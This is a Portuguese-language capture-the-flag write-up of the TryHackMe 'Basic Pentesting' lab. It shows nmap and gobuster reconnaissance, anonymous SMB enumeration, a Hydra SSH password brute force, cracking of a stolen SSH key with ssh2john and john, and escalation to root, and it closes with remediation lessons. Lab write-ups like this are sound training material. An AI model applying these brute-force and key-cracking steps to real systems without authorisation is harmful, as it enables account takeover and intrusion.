# Basic Pentesting
Essa é uma máquina do [Josias do Vulnhub](https://www.vulnhub.com/author/josiah-pierce,569/) que está hospedada no THM.
## Objetivo
O objetivo principal aqui é aprender o máximo possível

Nesta maquina, vocẽ aprenderá o seguinte:

  	*Brute Force
  	*Quebra de hash 
	*Enumeração de serviços
  	*Enumeração do Linux

## Recon
Recebemos o $IP.

Vamos investiga-ló com o NMAP:
```Bash
$sudo nmap $IP -T5 -sS --disable-arp-ping -n
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

#########

$sudo nmap $IP -T5 -sS --disable-arp-ping -n -p80 -sC  -sV
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

#########

$sudo nmap $IP -T5 -sS --disable-arp-ping -n -p139,445 -sV
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```
### Flags:

-T5 = Velocidade 

-sS = Varedura Sync

--disable-arp-ping = Disabilita a varedura arp

-n = Desabilita a resolução de nomes

-p = Especifica a Porta

-sC = Script Padrão

-sV = Procurar pela versão

Ao entrar no site notei que ele está em processo de desemvolvimento, então olhei o código fonte da página e me surpreendi:
```html
<!-- Check our dev note section if you need to know what to work on. -->
```

Aparti de agora o objetivo e fazer um Fuzz em diretórios:

```BASH
gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,txt,html
.
.
.
/development          (Status: 301) [Size: 318] [--> http://10.201.52.99/development/]
```
### Flags: 

-u = URL ou IP

-w = Wordlist 

-t = Potencia

-x = Procurar por arquivos com as extensões especificadas

Ao Entrarmos no diretório "/development" temos dois arquivos: [dev.txt](dev.txt) e [j.txt](j.txt).

### Recaptulando
Temos 4 portas;

Temos 2 arquivos;

Temos possiveis iniciais do nome de usuários;

Temos um SMB;

## Recon... Parte 2
vamos enumerar o SMB:
```BASH
  $enum4linux $IP

Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      
	IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)
-- (excessos retirados)

//$IP/Anonymous	Mapping: OK Listing: OK Writing: N/A

-------------------------------
  $smbclient //$IP/Anonymous
Password for [WORKGROUP/Anonymous]: --somente teclar enter
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 14:31:20 2018
  ..                                  D        0  Thu Apr 19 14:13:06 2018
  staff.txt                           N      173  Thu Apr 19 14:29:55 2018

		14282840 blocks of size 1024. 6247584 blocks available
smb: \> get staff
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \staff
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
smb: \> qui
```
Encontramos o aquivo [staff.txt](staff.txt). Ele tem Traz para nos dois nomes de usuarios: Jan e Kay.

## Acesso Inicial
Com o usuários em mãos, podemos notar que temos a opção de brute force. Utilizaremos o Hydra.

```BASH
hydra -l jan -P /usr/share/wordlists/rockyou.txt $IP ssh

[22][ssh] host: $IP   login: jan   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found

```
hahaha, muito bom, né? Comente se voce leu isso!

Agora vou me conectar ao servidor...
```BASH
ssh jan@$IP
 password:

jan@ip-10-201-52-99:~$ pwd
/home/jan
jan@ip-10-201-52-99:~$ ls -al
total 12
drwxr-xr-x 2 root root 4096 Apr 23  2018 .
drwxr-xr-x 5 root root 4096 Nov  5 15:05 ..
-rw------- 1 root jan    47 Apr 23  2018 .lesshst
jan@ip-10-201-52-99:~$ whoami
jan
jan@ip-10-201-52-99:~$ id
uid=1001(jan) gid=1001(jan) groups=1001(jan)
jan@ip-10-201-52-99:~$ cd /home
jan@ip-10-201-52-99:/home$ ls
jan  kay  ubuntu
jan@ip-10-201-52-99:/home$ sudo -l
[sudo] password for jan: 
Sorry, try again.
[sudo] password for jan: 
Sorry, user jan may not run sudo.
jan@ip-10-201-52-99:/home$ cat /etc/issue
Ubuntu 20.04.6 LTS \n \l

jan@ip-10-201-52-99:/home$ ls -al /etc/passwd
-rw-r--r-- 1 root root 2045 Nov  5 15:05 /etc/passwd

```
Parece que não temos o sudo ao nosso favor.

Depois de algum tempo enumerando percebi que não a maneiras diretas de escalar. Então decidi vasculhar a "home" do usuario kay. O diretório ".ssh" tem a chave privada, pública e a chaves de autorização. 

Seguindo o racíocinio básico gerariamos o hash com o script do john "ssh2john" e em seguida quebraremos com o john usando uma wordlist:

```BASH
$python3 /usr/share/john/ssh2john.py id_rsa > hashid
$sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashid 
  Press 'q' or Ctrl-C to abort, almost any other key for status
  [REDACTED]          (id_rsa)

```
### Comentario
{ps:cara, vocês não vão acreditar, o ssh2john não tava fucionando porque quando eu fui exportar a chave, eu sem querer esqueci o cabeçalho "-----BEGIN RSA PRIVATE KEY-----". O erro que acontecia era:
        
    ssh2john id_rsa authorized_keys 
    [id_rsa] couldn't parse keyfile
    [authorized_keys] couldn't parse keyfile
Eu quebrei a cabeça por um bom tempo. se eu tenho uma lição? Não esqueça das coisas e verifique pelo menos 3 vezes hahaha.}

### continuação

Feito isso podemos logar como kay.
```BASH
ssh kay@$IP -i id_rsa
pssword:
kay@ip-10-201-52-99:~$ ls -al
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 5 root root 4096 Nov  5 15:05 ..
-rw------- 1 kay  kay   789 Jun 22 13:41 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
kay@ip-10-201-52-99:~$ cat pass.bak 
[REDACTED]
kay@ip-10-201-52-99:~$ sudo su
[sudo] password for kay: 
root@ip-10-201-52-99:/home/kay# 
```
Essa foi uma maquina bem tranquila. Acredito que já deu pra pegar a essẽncia.
### Liçoes aprendidas

Esse laboratorio foi simples, com exessaão do pequeno deslise que eu cometi ao exporta a private key.

Prestar mais atençao aos detalhes.

Login como anonnymous no SMB.

Prestem atenção nos detalhes.

Procurar arquivos de configuraçao (ou não), que podem conter credenciais.

Uma boa pratica de remediação seria evitar deixar arquivos com dados sensivieis ( ou não tão sensiveis assim), em diretorios abertos. Digo nao tão senciveis quando penso no diretorio "/development". Ele contia informaçoes que informava que o Jan possuia a senha mais fraca e precisava ser atualizada.

"Um reconhecimento bem feito evita muito trabalho"

Ferramentas usadas: NMAP, Gobuster, enum4linux, hydra, ssh2john e john.

# Hack The World!!!
